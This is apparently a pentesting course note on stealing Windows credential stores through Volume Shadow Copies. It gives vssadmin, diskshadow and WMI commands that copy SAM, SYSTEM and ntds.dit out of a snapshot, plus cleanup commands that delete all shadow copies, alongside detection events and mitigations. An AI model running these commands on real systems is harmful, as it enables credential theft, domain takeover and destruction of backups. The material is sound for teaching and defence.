---
tags: [windows, privesc, pentesting, red-team]
difficulty: advanced
module: "43 - Windows Privilege Escalation"
topic: "43.32 Volume Shadow Copy Theft"
---

# 32 - Volume Shadow Copy Theft

## Executive Summary

Volume Shadow Copy (VSS) Theft is an advanced data exfiltration and credential harvesting methodology heavily utilized by both sophisticated Advanced Persistent Threats (APTs) and modern ransomware operators. It meticulously leverages the legitimate Windows Volume Shadow Copy Service—a robust framework inherently designed to create backup copies or snapshots of computer files or entire volumes, even when those files are actively in use. 

Attackers abuse this built-in functionality to bypass file-level locking mechanisms and access highly restricted system files. The most notable targets are the Active Directory database (`NTDS.dit`), the local SAM database, and the SYSTEM registry hive, which are otherwise heavily protected and locked by the operating system kernel during normal operation.

## Theoretical Foundation

**The Problem of File Locking:**
To maintain system stability and data integrity, the Windows operating system places exclusive read/write locks on highly critical files while the system is running. For instance, `C:\Windows\System32\config\SAM` or `C:\Windows\NTDS\ntds.dit` cannot be casually copied using standard administrative commands like `copy` or `type`, because the OS file manager returns a strict "File is in use by another process" error.

**Volume Shadow Copy Service (VSS):**
VSS acts as an intricate coordinator between backup applications, the underlying file system, and the physical storage hardware. When a snapshot is officially requested, VSS momentarily pauses write operations on the volume, creates a perfect point-in-time copy (a shadow), and then instantly resumes normal operations. 

**The Exploit Mechanism:**
The snapshot created by the VSS framework is an exact, read-only replica of the volume at that specific microsecond. Crucially, the sensitive files located within the shadow copy *are not locked* by the active operating system. An attacker possessing sufficient privileges can request the creation of a shadow copy, mount it or access its path directly, and seamlessly copy out the sensitive files for offline analysis.

## Architecture and ASCII Diagram

```text
+--------------------------------------------------------------------+
|               Volume Shadow Copy Extraction Architecture           |
|                                                                    |
|  [ Live File System (C:\) ]                                        |
|  +--------------------+                                            |
|  | C:\...\NTDS.dit    | <--- LOCKED (Access Denied)                |
|  +--------------------+                                            |
|           |                                                        |
|           | (1) Attacker invokes vssadmin / diskshadow             |
|           v                                                        |
|  +--------------------------------------------------+              |
|  | Volume Shadow Copy Service (VSS)                 |              |
|  +--------------------------------------------------+              |
|           |                                                        |
|           | (2) Creates Point-in-Time Snapshot                     |
|           v                                                        |
|  [ Shadow Copy Volume (\\?\GLOBALROOT\...) ]                       |
|  +--------------------+                                            |
|  | \...\NTDS.dit      | <--- UNLOCKED (Read Access Granted)        |
|  +--------------------+                                            |
|           |                                                        |
|           | (3) Attacker copies file to exfiltration path          |
|           v                                                        |
|  +--------------------+                                            |
|  | C:\Temp\NTDS.dit   | <--- Successfully Exfiltrated!             |
|  +--------------------+                                            |
+--------------------------------------------------------------------+
```

## Prerequisites and Environment Setup

To successfully abuse Volume Shadow Copies, the attacker must satisfy the following conditions:

1. **Administrative Privileges:** The fundamental ability to interact with the VSS service and request snapshots absolutely requires local administrator or `NT AUTHORITY\SYSTEM` rights.
2. **Access to VSS Utilities:** Access to built-in system utilities such as `vssadmin.exe`, `diskshadow.exe`, or Windows Management Instrumentation (WMI) interfaces via PowerShell.

## Detailed Exploitation Walkthrough

### Scenario 1: The `vssadmin.exe` Method (Traditional)

This is the most traditional technique, though it is heavily monitored by modern EDR solutions.

**Step 1: Create the Shadow Copy**

Open an elevated command prompt and explicitly create a shadow copy of the specific volume containing the target files (almost always the `C:` drive).

```cmd
C:\> vssadmin create shadow /for=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {A1B2C3D4-E5F6-7890-1234-567890ABCDEF}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

Meticulously note the `Shadow Copy Volume Name` provided in the output.

**Step 2: Exfiltrate the Locked Files**

Utilize standard `copy` commands to extract the files directly from the shadow copy volume path. The path functions identically to a normal, albeit hidden, drive letter.

```cmd
# Extracting local credential hives
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM.save
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM.save

# Extracting the Active Directory Database (if executed on a Domain Controller)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
```

**Step 3: Forensic Cleanup**

To avoid immediate detection and leave a minimal forensic footprint, attackers must delete the shadow copy immediately after successful extraction.

```cmd
vssadmin delete shadows /shadow={A1B2C3D4-E5F6-7890-1234-567890ABCDEF} /quiet
# Or simply nuke all shadow copies entirely
vssadmin delete shadows /all /quiet
```

### Scenario 2: The `diskshadow.exe` Method (Living off the Land)

Because the command-line arguments of `vssadmin` are heavily monitored, sophisticated attackers often pivot to utilizing `diskshadow.exe`. Diskshadow is an incredibly powerful, in-box, Microsoft-signed utility available primarily on Windows Server operating systems, making it an exceptional Living off the Land Binary (LOLBin).

**Step 1: Construct the Execution Script**

Diskshadow possesses the capability to execute a series of commands from a text file, elegantly bypassing simple command-line argument monitoring. The attacker creates a file named `script.txt`.

```text
# script.txt
set context persistent nowriters
add volume c: alias temp_alias
create
expose %temp_alias% z:
```

**Step 2: Execute and Exfiltrate**

Run `diskshadow` passing the script file. This script creates the shadow copy and immediately exposes it as a standard drive letter (`Z:`).

```cmd
diskshadow.exe /s script.txt

# Extract the files from the newly exposed Z: drive
copy Z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy Z:\Windows\System32\config\SYSTEM C:\temp\SYSTEM.save
```

**Step 3: Cleanup via Script**

Clean up by removing the exposed drive letter and destroying the shadow copy.

```text
# cleanup.txt
delete shadows all
unexpose z:
```
```cmd
diskshadow.exe /s cleanup.txt
```

## Advanced Techniques & Bypasses

1. **WMI and PowerShell:** Instead of utilizing easily monitored `.exe` tools, attackers can leverage Windows Management Instrumentation (WMI) via PowerShell to request shadow copies entirely in memory, completely evading process-creation monitoring associated with `vssadmin.exe`.
   ```powershell
   (Get-WmiObject -List Win32_ShadowCopy).Create("C:\", "ClientAccessible")
   ```
2. **Direct Sector Reading (NinjaCopy):** The infamous `Invoke-NinjaCopy` PowerShell script circumvents the VSS API and the NTFS file system drivers entirely. Instead of creating a snapshot, it reads the raw sectors of the hard drive directly to reconstruct the locked files. This deeply advanced technique bypasses virtually all file-level and VSS-level security monitoring.

## Indicators of Compromise (IoCs) & Detection Engineering

### Log Sources and Telemetry

1. **Windows Security Event Logs / Sysmon:**
   - `Event ID 4688` (Process Creation) / Sysmon `Event ID 1`: Monitor explicitly for `vssadmin.exe` paired with arguments like `create shadow` or `delete shadows /all`.
   - Monitor for execution of `diskshadow.exe` utilizing the `/s` script execution flag.
2. **System Event Logs:**
   - Look for `Event ID 7036` indicating the Volume Shadow Copy service entering a running state unexpectedly during non-backup hours.

### Mitigation Strategies

1. **Strict Monitoring:** Since legitimate backup software utilizes VSS, it cannot be disabled. Robust detection rules must be engineered to differentiate between legitimate enterprise backup solutions (e.g., Veeam, Commvault) and anomalous manual invocations via command-line utilities.

## Chaining Opportunities

- **Complete Domain Compromise:** This technique is the absolute primary method utilized to extract the `NTDS.dit` file. Once extracted, the attacker cracks the domain hashes offline, inevitably leading to complete Active Directory compromise (e.g., forging Golden Tickets, escalating to Enterprise Admin).
- **Ransomware Operations:** Ironically, ransomware actors actively target VSS, but their objective is purely destructive. They execute `vssadmin delete shadows /all /quiet` *prior* to encrypting the file system to ensure victims absolutely cannot restore their data from local, automated backups.

## Related Notes
- [[25 - Abusing SeBackupPrivilege SeRestorePrivilege]]
- [[31 - Credential Dumping]]
